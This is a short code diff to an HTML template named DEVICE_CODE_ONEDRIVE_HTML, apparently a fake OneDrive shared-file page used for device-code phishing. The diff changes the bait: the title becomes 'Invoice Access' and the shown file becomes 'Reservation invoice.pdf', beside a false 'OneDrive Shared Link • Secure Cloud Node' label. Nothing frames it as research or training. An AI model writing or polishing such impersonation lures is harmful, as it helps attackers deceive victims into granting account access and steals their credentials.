@@ -964,7 +964,7 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Document Access</title>
+<title>Invoice Access</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -1421,7 +1421,7 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
             <text x="312" y="414" font-family="Segoe UI, Inter, sans-serif" font-size="64" font-weight="800" fill="#fff" text-anchor="middle">PDF</text>
           </svg>
           <div class="file-meta">
-            <div class="file-name">Financial_Invoice_Audit.pdf</div>
+            <div class="file-name">Reservation invoice.pdf</div>
             <div class="file-sub">OneDrive Shared Link &bull; Secure Cloud Node</div>
           </div>
         </div>
